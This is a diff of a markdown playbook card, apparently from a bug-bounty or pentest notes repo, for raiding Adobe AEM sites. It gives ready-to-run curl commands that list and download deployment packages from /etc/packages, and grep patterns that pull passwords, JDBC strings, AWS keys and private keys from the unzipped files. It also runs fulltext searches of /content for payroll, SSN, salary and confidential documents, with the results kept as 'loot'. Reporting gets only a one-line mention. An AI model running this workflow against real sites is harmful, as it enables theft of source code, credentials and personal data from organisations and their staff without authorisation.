@@ -1,83 +1,85 @@
-# Batch 08 — Packages + content secret mining
+# Batch 08 — Packages + secret files
 
-## objective
+## GOAL
+Download deployment zips and hunt files that hold passwords/source. Save loot **outside git**.
 
-Turn QueryBuilder/json leads into **files on disk**: deployment packages and sensitive DAM/content objects. Grep offline for secrets.
+## TIME
+~1–2 hours
 
-## estimated_time
+## YOU NEED
+- Leads from batch 07
+- Folder like `~/loot/aem/` (not in the notes repo)
 
-60–120 minutes
+---
 
-## prerequisites
+## WHY (30 seconds)
 
-- Batch 07 notes (paths that looked interesting)
-- `QB` and/or working `.json` dump URL
-- Place to store loot **outside git**
+When companies deploy AEM code, zips often land under `/etc/packages`.  
+Those zips can hold **source code + database passwords + API keys**.  
+Also authors drop “private” PDFs under `/content` like a messy shared drive.  
+This card is pure loot collection — no fancy bugs.
 
-## testing_workflow
+---
 
-### 1) Technique A — list packages
+## DO THIS
 
 ```bash
-T="https://TARGET"
-QB="$T/..."   # your working QB
-
-curl -sk -G "$QB" \
-  --data-urlencode "path=/etc/packages" \
-  --data-urlencode "p.limit=100" -o packages-qb.json
-
-curl -sk -o packages-1.json -w "%{http_code} %{size_download}\n" \
-  "$T/etc/packages.1.json"
-curl -sk -o packages-2.json -w "%{http_code} %{size_download}\n" \
-  "$T/etc/packages.2.json"
+T="https://PUT-THE-SITE-HERE"
+QB="PASTE_WORKING_QB"
+mkdir -p ~/loot/aem && cd ~/loot/aem
 ```
 
-Extract zip URLs/paths from JSON (manual or `jq` if available).
-
-### 2) Technique B — download 1–3 candidate zips
+### 1) List packages
 
 ```bash
-mkdir -p ~/loot/aem-packages && cd ~/loot/aem-packages
-# Example — replace with real path from listing
-curl -sk -O "$T/etc/packages/my_packages/customer-all-1.0.zip"
+curl -sk -G "$QB" \
+  --data-urlencode "path=/etc/packages" \
+  --data-urlencode "p.limit=100" -o packages.json
+head -c 800 packages.json; echo
+
+curl -sk -o packages-1.json -w "%{http_code}\n" "$T/etc/packages.1.json"
+```
+
+### 2) Download 1–3 zips (fix paths from JSON)
+
+```bash
+# CHANGE the path to a real one from packages.json
+curl -sk -O "$T/etc/packages/my_packages/something.zip"
 ls -la
 ```
 
+### 3) Open and grep (offline)
+
 ```bash
-unzip -l customer-all-1.0.zip | head -40
-unzip -o customer-all-1.0.zip -d customer-all
-grep -RniE 'password|secret|api[_-]?key|jdbc:|AKIA|BEGIN (RSA |OPENSSH )?PRIVATE|private_key' customer-all \
-  | head -60
+unzip -l something.zip | head -30
+unzip -o something.zip -d pkg1
+grep -RniE 'password|secret|api[_-]?key|jdbc:|AKIA|PRIVATE KEY' pkg1 | head -40
 ```
 
-### 3) Technique C — content/DAM mining (no zip required)
+### 4) Content keyword pass (if no zips)
 
 ```bash
-for term in confidential internal backup payroll ssn salary earnings "do not publish"; do
+for term in confidential internal backup payroll earnings; do
   echo "===== $term ====="
   curl -sk -G "$QB" \
     --data-urlencode "path=/content" \
     --data-urlencode "fulltext=$term" \
-    --data-urlencode "p.limit=10" | head -c 300
+    --data-urlencode "p.limit=8" | head -c 250
   echo
 done
 ```
 
-Download any high-value asset URL you can resolve (PDF/XLS) into `~/loot/` only.
+---
 
-## decision_points
+## IF / THEN
 
-| If… | Then… |
-|-----|--------|
-| Secrets in package | Document impact; optional custom-selector hunt in source → later **10/11** |
-| Packages blocked, content open | Report content disclosure; continue **09** |
-| Nothing sensitive | Still record access level; go **09** for XSS track |
+| What you saw | What you do |
+|--------------|-------------|
+| Real secrets | Screenshot + report notes. Keep files private |
+| Packages blocked | Content mining only — still valid |
+| Done for today | Go **NEXT** (XSS track) |
 
-## expected_findings
+---
 
-- Source code disclosure, credentials, WAF/API keys, confidential docs (classic “packages heist” impact)
-
-## next_batch_to_continue_with
-
-→ **[09-xss-rawcontent.md](./09-xss-rawcontent.md)**  
-If Forms flagged earlier → after 09–11 or parallel next session **[12-forms-surface.md](./12-forms-surface.md)**
+## NEXT
+→ [09-xss-rawcontent.md](./09-xss-rawcontent.md)
